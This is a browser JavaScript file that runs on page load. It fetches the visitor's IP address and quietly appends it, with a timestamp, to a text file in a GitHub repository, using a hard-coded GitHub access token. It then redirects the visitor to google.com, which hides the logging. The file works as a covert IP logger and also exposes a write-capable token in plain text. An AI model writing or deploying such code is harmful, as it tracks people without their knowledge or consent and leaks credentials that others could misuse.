let ipaa = ""
const options = {
    weekday: 'short', // or 'short', 'narrow'
    year: 'numeric',
    month: 'short', // or 'short', 'narrow'
    day: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
    timeZoneName: 'short' // or 'long'
  };

document.addEventListener('DOMContentLoaded', function () {
    // Fetch IP information from the API
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            // Display the IP information on the webpage
            // document.getElementById('ipSection').innerHTML = `
            //     <h2>Your IP Address:</h2>
            //     <p>${data.ip}</p>
            // `;
            ipaa = data.ip
        })
        .then(() => {
            updateFile()
        })
        .catch(error => console.error('Error fetching IP:', error));
});

// document.addEventListener("DOMContentLoaded", function() {
//     // Replace 'owner', 'repo', and 'path' with the desired GitHub repository owner, repository name, and file path
//     const owner = 'indesisive';
//     const repo = 'swint';
//     const path = 'reals.txt';

//     // Replace 'YOUR_PERSONAL_ACCESS_TOKEN' with your actual GitHub Personal Access Token
//     const accessToken = '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';

//     const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;

//     // Make a GET request to the GitHub API to get the current content of the file
//     fetch(apiUrl)
//         .then(response => response.json())
//         .then(data => {
//             // Populate the textarea with the current content of the file
//             document.getElementById('fileContent').value = atob(data.content);
//             content = atob(data.content)
//         })
//         .then(() => {
//             updateFile()
//         })
//         .catch(error => console.error('Error fetching file content:', error));
// });

async function updateFile() {
    const accessToken = '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';
    const owner = 'indesisive';
const repo = 'swint';
const path = 'reals.txt';
const branch = "main";
let latestCommitSHA = "";

const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;
// console.log(apiUrl); // Corrected variable name

const fileContent = "Your file content here"; // Replace with the actual content you want to set

// Fetch the latest commit SHA
await fetch(`https://api.github.com/repos/${owner}/${repo}/git/refs/heads/${branch}`, {
    headers: {
        'Authorization': `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
    },
})
.then(response => response.json())
.then(data => {
    latestCommitSHA = data.object.sha;
})
.catch(error => console.error('Error fetching latest commit SHA:', error));

// console.log(latestCommitSHA);

// Make a GET request to the GitHub API to retrieve the current file content
await fetch(apiUrl, {
    headers: {
        'Authorization': `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
    },
})
.then(response => response.json())
.then(data => {
    // Decode the base64 content
    const currentFileContent = atob(data.content) + "\n" + new Date().toLocaleDateString('en-us', options) + " | " + ipaa
    // console.log('Current file content:', currentFileContent);

    // Update the fileContent variable if needed
    // fileContent = "Updated content";

    // Make a PUT request to the GitHub API to update the file
    return fetch(apiUrl, {
        method: 'PUT',
        headers: {
            'Authorization': `Bearer ${accessToken}`,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            message: 'Update file via API',
            content: btoa(currentFileContent), // Encode content to base64
            sha: data.sha, // Replace with the current SHA of the file
        }),
    });
})
.then(response => response.json())
.then(data => {
    console.log('File updated successfully:', data);
    window.location.href = 'http://www.google.com'
})
.catch(error => 
    console.error('Error updating file:', error)
    );

}